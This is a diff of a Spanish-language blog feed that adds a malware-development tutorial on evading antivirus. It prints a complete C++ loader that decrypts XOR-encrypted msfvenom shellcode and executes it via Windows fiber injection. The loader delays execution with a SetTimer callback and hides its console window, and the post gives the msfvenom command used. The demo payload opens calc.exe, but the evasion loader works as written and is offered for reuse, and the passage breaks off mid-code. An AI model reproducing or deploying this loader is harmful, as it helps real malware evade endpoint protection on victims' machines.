@@ -1,5 +1,283 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" hreflang="en" /><updated>2023-06-15T15:29:52-06:00</updated><id>/feed.xml</id><title type="html">c4rta</title><subtitle>Soy Omar, un radioaficionado amante de la ciberseguridad
-</subtitle><author><name>Omar</name></author><entry><title type="html">Inyeccion de procesos/codigo - shellcode via CreateRemoteThread + AntiDBG basico</title><link href="/blog/posts/2023-06-15-maldev-createRemoteThread/" rel="alternate" type="text/html" title="Inyeccion de procesos/codigo - shellcode via CreateRemoteThread + AntiDBG basico" /><published>2023-06-15T00:00:00-06:00</published><updated>2023-06-15T15:29:52-06:00</updated><id>/blog/posts/maldev-createRemoteThread</id><content type="html" xml:base="/blog/posts/2023-06-15-maldev-createRemoteThread/">&lt;p&gt;Que onda, esta vez que voy a enseñar a como puedes inyectar una shellcode en un proceso remoto usando CreateRemoteThread, o como tambien se le conoce “Remote Thread Injection”, ademas veremos una tecnica AntiDBG muy basica para evadir los depuradores&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" hreflang="en" /><updated>2023-06-16T13:32:51-06:00</updated><id>/feed.xml</id><title type="html">c4rta</title><subtitle>Soy Omar, un radioaficionado amante de la ciberseguridad
+</subtitle><author><name>Omar</name></author><entry><title type="html">Bypass AV - shellcode via Fiber injection + Timming attack</title><link href="/blog/posts/2023-06-16-maldev-bypassAV-fiberInjection/" rel="alternate" type="text/html" title="Bypass AV - shellcode via Fiber injection + Timming attack" /><published>2023-06-16T00:00:00-06:00</published><updated>2023-06-16T13:32:51-06:00</updated><id>/blog/posts/maldev-bypassAV-fiberInjection</id><content type="html" xml:base="/blog/posts/2023-06-16-maldev-bypassAV-fiberInjection/">&lt;p&gt;Que ondaa, esta vez te voy a enseñar como pude evadir la deteccion de todos los antivirus de antiscan.me, y el windows defender, para esto use  3 cosas&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Una shellcode cifrada con XOR&lt;/li&gt;
+  &lt;li&gt;La tecnica &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fiber injection&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Timming attack usando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SetTimer&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;fibers-fibras&quot;&gt;Fibers (Fibras)&lt;/h2&gt;
+
+&lt;p&gt;Como sabras, cuando se ejecuta una aplicacion, el sistema operativo le asigna un proceso dentro de la memoria, por ejemplo, los procesos que ves al abrir al administrador de tereas, pues bien, esos procesos pueden tener otros subprocesos para ejecutar tareas en paralelo, a esto se le conoce como hilos, y es algo clave en la programacion concurrente, sin embargo, dentro de un hilo se puede estar ejecutando otra tarea, y para esto se usan las fibras.&lt;/p&gt;
+
+&lt;p&gt;La definicion que nos da la WinAPI, es: &lt;strong&gt;“Una fibra es una unidad de ejecución que la aplicación debe programar manualmente”&lt;/strong&gt;, pero la neta no se le entiende casi nada, asi que pongamos algo mas simple, una fibra tambien es conocida como un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hilo liviano&lt;/code&gt;, es decir, una unidad de ejeucion que desprende de un hilo, osea que las fibras se ejecutan en el contexto del hilo que las creo, una caracteristica, es que un hilo puede tener varias fibras pero solo una puede ejecutarse una sola a la vez, y nosotros dedicimos cual.&lt;/p&gt;
+
+&lt;h2 id=&quot;timming-attack-o-ataques-basados-en-temporizadores&quot;&gt;Timming attack o ataques basados en temporizadores&lt;/h2&gt;
+
+&lt;p&gt;En el contexto del desarrollo de malware, un timming attack se refiere a suspender o dormir la actividad del malware por un cierto periodo de tiempo, por ejemplo, podemos agregar un delay cuando se ejecute por primera vez, o podemos decirle al malware que ejecute sus acciones en una fecha, hora, dia, y momento especifico, es decir, cada cierto tiempo, para estas implementaciones se usan funciones de temporizado, de ahi su nombre.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Ojo&lt;/strong&gt;: esto solo seria en el contexto del malware, tambien hay otro contexto de los timming attack que son los &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;side channel timing attack&lt;/code&gt; o en español, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ataques de canal lateral basados en temporizadores&lt;/code&gt;, pero eso es otro tema que no importa en este momento.&lt;/p&gt;
+
+&lt;h3 id=&quot;fiber-injection&quot;&gt;Fiber injection&lt;/h3&gt;
+
+&lt;p&gt;Es muy simple, la inyeccion de fibras se refiere a inyectar una fibra en el flujo de ejecucion del proceso, para implementar una inyeccion clasica de este tipo, se usan las funciones.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;ConvertThreadToFiber()&lt;/strong&gt;: Para convertir del hilo principal de una fibra&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;VirtualAlloc()&lt;/strong&gt;: Para asignar memoria para la fibra&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;CreateFiber()&lt;/strong&gt;: Para crear una nueva fibra que contendra la shellcode&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;SwitchToFiber()&lt;/strong&gt;: Para cambiar de contexto de la fibra que se creo y ejecutar la shellcode&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Llamando a las funciones en ese orden podriamos hacer una fiber injection clasica, pero al fin de cuenta esto es programacion, y cada quien la puede implementar como le sale de su cabecita, o dependiendo del contexto donde se vaya a ejecutar, ahora te voy a explicar como la implemente, primero de pondre todo el codigo y te explicare que es lo que hace&lt;/p&gt;
+
+&lt;h4 id=&quot;codigo-completo&quot;&gt;Codigo completo&lt;/h4&gt;
+
+&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;windows.h&amp;gt;
+#include &amp;lt;winuser.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;fiber_injection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
+	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+	    &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x86\x32\xf9\x9e\x8a\x92\xba\x7a\x7a\x7a\x3b\x2b\x3b\x2a&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	    &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x28\x2b\x2c\x32\x4b\xa8\x1f\x32\xf1\x28\x1a\x32\xf1\x28&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	    &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x62\x32\xf1\x28\x5a\x32\xf1\x08\x2a\x32\x75\xcd\x30\x30&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	    &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x37\x4b\xb3\x32\x4b\xba\xd6\x46\x1b\x06\x78\x56\x5a\x3b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	    &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xbb\xb3\x77\x3b\x7b\xbb\x98\x97\x28\x3b\x2b\x32\xf1\x28&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	    &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x5a\xf1\x38\x46\x32\x7b\xaa\xf1\xfa\xf2\x7a\x7a\x7a\x32&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	    &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xff\xba\x0e\x1d\x32\x7b\xaa\x2a\xf1\x32\x62\x3e\xf1\x3a&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	    &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x5a\x33\x7b\xaa\x99\x2c\x32\x85\xb3\x3b\xf1\x4e\xf2\x32&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	    &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x7b\xac\x37\x4b\xb3\x32\x4b\xba\xd6\x3b\xbb\xb3\x77\x3b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	    &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x7b\xbb\x42\x9a\x0f\x8b\x36\x79\x36\x5e\x72\x3f\x43\xab&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	    &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x0f\xa2\x22\x3e\xf1\x3a\x5e\x33\x7b\xaa\x1c\x3b\xf1\x76&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	    &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x32\x3e\xf1\x3a\x66\x33\x7b\xaa\x3b\xf1\x7e\xf2\x32\x7b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	    &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xaa\x3b\x22\x3b\x22\x24\x23\x20\x3b\x22\x3b\x23\x3b\x20&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	    &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x32\xf9\x96\x5a\x3b\x28\x85\x9a\x22\x3b\x23\x20\x32\xf1&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	    &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x68\x93\x2d\x85\x85\x85\x27\x32\xc0\x7b\x7a\x7a\x7a\x7a&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	    &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x7a\x7a\x7a\x32\xf7\xf7\x7b\x7b\x7a\x7a\x3b\xc0\x4b\xf1&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	    &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x15\xfd\x85\xaf\xc1\x8a\xcf\xd8\x2c\x3b\xc0\xdc\xef\xc7&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	    &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xe7\x85\xaf\x32\xf9\xbe\x52\x46\x7c\x06\x70\xfa\x81\x9a&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	    &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x0f\x7f\xc1\x3d\x69\x08\x15\x10\x7a\x23\x3b\xf3\xa0\x85&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	    &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xaf\x19\x1b\x16\x19\x54\x1f\x02\x1f\x7a&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+
+	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'z'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+  	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode_len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+	&lt;span class=&quot;n&quot;&gt;LPVOID&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exec_mem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;LPVOID&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode_fiber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 
+
+	&lt;span class=&quot;n&quot;&gt;exec_mem&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;VirtualAlloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+	    &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	    &lt;span class=&quot;n&quot;&gt;shellcode_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	    &lt;span class=&quot;n&quot;&gt;MEM_COMMIT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	    &lt;span class=&quot;n&quot;&gt;PAGE_EXECUTE_READWRITE&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+	&lt;span class=&quot;n&quot;&gt;memcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exec_mem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;shellcode_fiber&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CreateFiber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LPFIBER_START_ROUTINE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exec_mem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+  	&lt;span class=&quot;n&quot;&gt;SwitchToFiber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode_fiber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+  	&lt;span class=&quot;n&quot;&gt;DeleteFiber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode_fiber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  	&lt;span class=&quot;n&quot;&gt;VirtualFree&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exec_mem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MEM_RELEASE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;VOID&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CALLBACK&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;shellcode_routine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PVOID&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;param&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;UINT_PTR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timerId&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SetTimer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[](&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HWND&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hwnd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UINT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uMsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UINT_PTR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idEvent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dwTime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    	&lt;span class=&quot;n&quot;&gt;fiber_injection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+    	&lt;span class=&quot;n&quot;&gt;KillTimer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idEvent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  	&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
+
+  	&lt;span class=&quot;n&quot;&gt;MSG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  	&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GetMessage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)){&lt;/span&gt;	
+    	&lt;span class=&quot;n&quot;&gt;TranslateMessage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    	&lt;span class=&quot;n&quot;&gt;DispatchMessage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
+	
+	&lt;span class=&quot;n&quot;&gt;HWND&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ventana_cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GetConsoleWindow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;ShowWindow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ventana_cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SW_HIDE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+	&lt;span class=&quot;n&quot;&gt;LPVOID&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main_fiber&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ConvertThreadToFiber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  	&lt;span class=&quot;n&quot;&gt;LPVOID&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode_fiber&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CreateFiber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode_routine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  	&lt;span class=&quot;n&quot;&gt;SwitchToFiber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode_fiber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  	&lt;span class=&quot;n&quot;&gt;SwitchToFiber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main_fiber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+  	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;funcion-fiber_injection&quot;&gt;Funcion fiber_injection()&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Dentro de la funcion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fiber_injection()&lt;/code&gt; tenemos la definicion de nuestra shellcode, esa shellcode fue generada con msfvenom usando crifrado XOR la cual ejecuta el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmd.exe&lt;/code&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfvenom -p windows/x64/exec CMD=calc.exe -f c --encrypt xor --encrypt-key z&lt;/code&gt;.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Posteriormente para poder inyectar la shellcode, la debemos de decifrar en tiempo de ejecucion usando la operacion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;XOR&lt;/code&gt; con la clave de cifrado, y para eso usamos este for:&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
